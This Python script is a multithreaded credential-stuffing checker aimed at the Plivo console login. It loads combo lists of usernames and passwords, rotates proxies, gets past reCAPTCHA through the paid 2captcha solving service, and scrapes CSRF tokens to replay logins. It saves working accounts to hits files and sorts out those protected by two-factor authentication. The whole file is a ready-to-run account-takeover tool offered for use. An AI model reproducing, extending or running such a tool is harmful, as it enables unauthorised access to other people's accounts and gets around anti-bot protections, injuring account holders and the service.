import requests,time,math,config,json,random
from threading import Thread
from colorama import init, Fore
from pyquery import PyQuery as pq
from os import system
syslogo = """

 /$$$$$$$  /$$       /$$$$$$ /$$    /$$  /$$$$$$ 
| $$__  $$| $$      |_  $$_/| $$   | $$ /$$__  $$
| $$  \ $$| $$        | $$  | $$   | $$| $$  \ $$
| $$$$$$$/| $$        | $$  |  $$ / $$/| $$  | $$
| $$____/ | $$        | $$   \  $$ $$/ | $$  | $$
| $$      | $$        | $$    \  $$$/  | $$  | $$
| $$      | $$$$$$$$ /$$$$$$   \  $/   |  $$$$$$/
|__/      |________/|______/    \_/     \______/ 
                                                                                                                                                                                                                                                                                                                                        
"""
hits = 0
invalid = 0
cns = 0


def createJSON(threads):
    jsonObj = {"lines":0}
    for i in range(1,threads+1):jsonObj[str(i)] = ''
    
    json_object = json.dumps(jsonObj, indent=4)
    with open("files/lastSession.json", "w") as outfile:outfile.write(json_object)
    return jsonObj


def readJSON():
    try:
        with open("files/lastSession.json", "r+") as outfile:
            data = json.load(outfile)
    except: data = {}
    return data

lastSessionJSON = readJSON()

def updateJSON(jsonObj):
    json_object = json.dumps(jsonObj, indent=4)
    
    with open("files/lastSession.json", "w") as outfile:outfile.write(json_object)

def get_captcha():
    cap_key = config.twocaptcha_key
    site_key,site_url = '6LcYXYgUAAAAADG8wt12Lw3KR3GcObwQLqpSIWUi','https://console.plivo.com/accounts/login/'
    captcha_id = requests.post("http://2captcha.com/in.php?key={}&method=userrecaptcha&googlekey={}&pageurl={}&invisible=1".format(cap_key, site_key, site_url)).text.split('|')[1]
    recaptcha_answer = requests.get("http://2captcha.com/res.php?key={}&action=get&id={}".format(cap_key, captcha_id)).text
    while 'CAPCHA_NOT_READY' in recaptcha_answer:
        time.sleep(2)
        recaptcha_answer = requests.get("http://2captcha.com/res.php?key={}&action=get&id={}".format(cap_key, captcha_id)).text
    captchaToken = recaptcha_answer.split('|')[1]
    return captchaToken
            


def PlivoSession(data,proxy):
    class Client:
        def __init__(self,username,password,proxy) -> None:
            proxies = {'http': proxy,'https':proxy}
            rsession = requests.Session()
            if proxy != 'http://':
                rsession.proxies.update(proxies)
            self.sesh = rsession
            self.username = str(username)
            self.password = str(password)


        def checkSub(self):
            if config.debug == True:print(Fore.MAGENTA, f'Checking {self.username}',Fore.RESET)
            headers = {
                'authority': 'console.plivo.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            }

            response = self.sesh.get('https://console.plivo.com/accounts/login/', headers=headers)

            handler = pq(response.text)

            csrfmiddlewaretoken = handler('input[name="csrfmiddlewaretoken"]').val()


            headers = {
                'authority': 'console.plivo.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'origin': 'https://console.plivo.com',
                'referer': 'https://console.plivo.com/accounts/login/',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            }
            if config.debug == True:print(Fore.MAGENTA, f'Getting Captcha {self.username}',Fore.RESET)

            captcha_token = get_captcha()

            data = {
                'csrfmiddlewaretoken': csrfmiddlewaretoken,
                'username': self.username,
                'password': self.password,
                'g-recaptcha-response': captcha_token
            }
            if config.debug == True:print(Fore.MAGENTA, f'Captcha {captcha_token} - {self.username}',Fore.RESET)

            try:response = self.sesh.post('https://console.plivo.com/accounts/login/', headers=headers, data=data)
            except:return 'TIMEOUT'

            if "Two-Factor Authentication" in response.text:
                with open(f'control/{self.username}.html','w',encoding='utf-8') as raw:raw.write(response.text)
                return '2FA'
            elif "Please enter correct email and password. Note that both fields are case-sensitive." in response.text:
                return False
            elif "<p>Please verify that you are a human being.</p>" in response.text:
                return 'CAPTCHA ERROR'
            elif "Please turn off your proxy service, refresh the page and try again." in response.text:
                return 'PROXY ERROR'
            else:
                with open(f'control/{self.username}.html','w',encoding='utf-8') as raw:raw.write(response.text)
                return True



    try:
        username,password = data.strip().split(config.delimiter)
    except:
        try:
            username,password = data.strip().split(config.snd_delimiter)
        except:
            return 'WRONG COMBO'
    try:
        client = Client(username,password,proxy)
        if config.debug == True:print(Fore.MAGENTA, f'Client for {data} created',Fore.RESET)
        result = client.checkSub()
    except Exception as exc:
        print(exc)
        result = 'ERROR'
    if config.debug == True:print(Fore.MAGENTA, f"{data}|VALID:{result}",Fore.RESET)
    return result


def Controller(users,proxies,thread_id):
    global hits
    global invalid
    global syslogo
    global lastSessionJSON
    global cns
    pass_rate = 0
    count,proxy_count = 0,0
    while count < len(users):
        if pass_rate == 2:
            pass_rate = 0
            cns+=1
            count+=1
        try:
            USER = users[count]
        except:break
        if config.user_pass_proxy_address != '':
            PROXY = config.user_pass_proxy_address
        else:
            try:
                #PROXY = proxies[proxy_count]
                PROXY = random.choice(proxies)
                try:
                    int(PROXY)
                    PROXY = ''
                except:
                    pass
            except:
                PROXY = ''
        if 'http' not in PROXY: PROXY = 'http://'+PROXY
        if config.debug == True:print(Fore.MAGENTA,USER,PROXY ,'started',Fore.RESET)
        try:result = PlivoSession(USER,PROXY)
        except Exception as exc:
            print(USER,PROXY)
            print(exc, result)
            continue
        if result == 'WRONG COMBO':
            print(f'{Fore.RED} [-] {USER} WRONG COMBO {Fore.RESET}')
            invalid+=1
        if result == 'TIMEOUT':
            if config.debug == True:print(f'{Fore.BLUE} [{result}] {USER} {PROXY} {Fore.RESET}')
            print(Fore.BLUE,USER,'proxy Timeout',Fore.RESET)
            pass_rate+=1
            continue
        elif result in ['PROXY ERROR','CAPTCHA ERROR']:
            if config.debug == True:print(f'{Fore.BLUE} [{result}] {USER} {PROXY} {Fore.RESET}')
            print(Fore.BLUE,USER,result,Fore.RESET)
            pass_rate+=1
            continue
        elif result == True:
            hits+=1
            print(f'{Fore.GREEN} [+] {USER} {Fore.RESET}')
            with open(f"{config.filesFolder}/hits.txt", 'a+') as raw:raw.write(f"{USER}\n")
        elif result == '2FA':
            hits+=1
            print(f'{Fore.YELLOW} [+ 2FA] {USER} {Fore.RESET}')
            #with open(f"{config.filesFolder}/hits.txt", 'a+') as raw:raw.write(f"{USER}\n")
            with open(f"{config.filesFolder}/hits2fa.txt", 'a+') as raw:raw.write(f"{USER}\n")  
        else:
            invalid+=1
            print(f'{Fore.RED} [-] {USER} {Fore.RESET}')
        if config.debug == True:print(Fore.MAGENTA,USER,'finished',Fore.RESET)
        lastSessionJSON[str(thread_id)] = USER
        
    
        count+=1
        #proxy_count+=1



def struct(th,file,de=None):
    global lastSessionJSON
    
    with open(file, "r+",encoding="utf8",errors='ignore') as f:l = [p.strip() for p in f.readlines()]
    amount = int(math.ceil(len(l) / th))
    l = [
        l[x : x + amount] for x in range(0, len(l), amount)
    ]
    if len(l) % th > 0.0:
        l[len(l) - 1].append(l[len(l) - 1])
    if  de.lower() == 'c':
        jsonObj = readJSON()
        for key in jsonObj:
            if key == 'lines':continue
            if jsonObj[key] == '':
                ind = -1
            else:
                ind = l[int(key)-1].index(jsonObj[key])
            l[int(key)-1] = l[int(key)-1][ind+1:]
    else:
        lastSessionJSON = createJSON(int(th))
    if isinstance(l[-1][-1] , list):
        l[-1] = l[-1].pop(-1)

    return l

    

def setup(number_threads,de):
    thread_count = float(number_threads)
    user_list =  struct(thread_count,f"{config.filesFolder}/{config.usersFile}",de)

    with open(f"{config.filesFolder}/{config.proxyFile}", "r+") as f: proxies_list = [p.strip() for p in f.readlines() if p.strip() != '']
    if len(proxies_list) == 0:
        proxies_list = [str(x) for x in range(0,len(user_list))]

    return proxies_list,user_list

def runner(): 
    global hits
    global invalid
    global cpm 
    global lastSessionJSON
    global cns
    with open('files/users.txt', "r+",encoding="utf8",errors='ignore') as f: all = len(f.readlines())

    while True: 
        oldchecked = hits + invalid 
        time.sleep(1) 
        newchecked = invalid + hits 
        cpm = (newchecked - oldchecked) * 60
        lastSessionJSON['lines']= newchecked+cns
        updateJSON(lastSessionJSON)
        log = f"Plivo Checker - Hits: {hits}  Invalid: {invalid} CNS: {cns} Remaining: {lastSessionJSON['lines']}/{all} CPM: {str(cpm)}"
        system("title " + log)
        
        try:
            if newchecked >= all:
                break
        except Exception as exc:
            print(exc)
        
        #print(log)
        
        
 







def main(threads,de):
    proxies_list,user_list = setup(threads,de)
    thread_list = []
    count = 0

    thread_list.append(Thread(target=runner))
    thread_list[0].start()

    for i in range(0,len(user_list)):
        thread_list.append(Thread(target=Controller, args=([user_list[i],proxies_list,i+1])))
        thread_list[len(thread_list) - 1].start()
        time.sleep(0.05)
        count += 1


    for x in thread_list:
        x.join()
system("title " + 'Plivo Checker')

print(Fore.GREEN, syslogo, Fore.RESET)
de = input('\nDo you want to restart or continue (R/C):\n - ')
if de.lower() == 'c':
    try:
        th = max([int(x) for x in list(lastSessionJSON.keys()) if x != 'lines'])
    except:
        print('NO PREVIOUS SESSION FOUND\n')
        de = 'r'
        if input('Do you want to clear the current output files? (Y)es/(N)o\n: - ').lower() == 'y':
            with open('files/hits.txt','w') as raw:raw.write('')
        th = int(input('Input thread amount:\n - '))
    
else:
    if input('Do you want to clear the current output files? (Y)es/(N)o\n: - ').lower() == 'y':
        with open('files/hits.txt','w') as raw:raw.write('')
    th = int(input('Input thread amount:\n - '))
print("\n")
main(th,de)


print('FINISHED')
input()




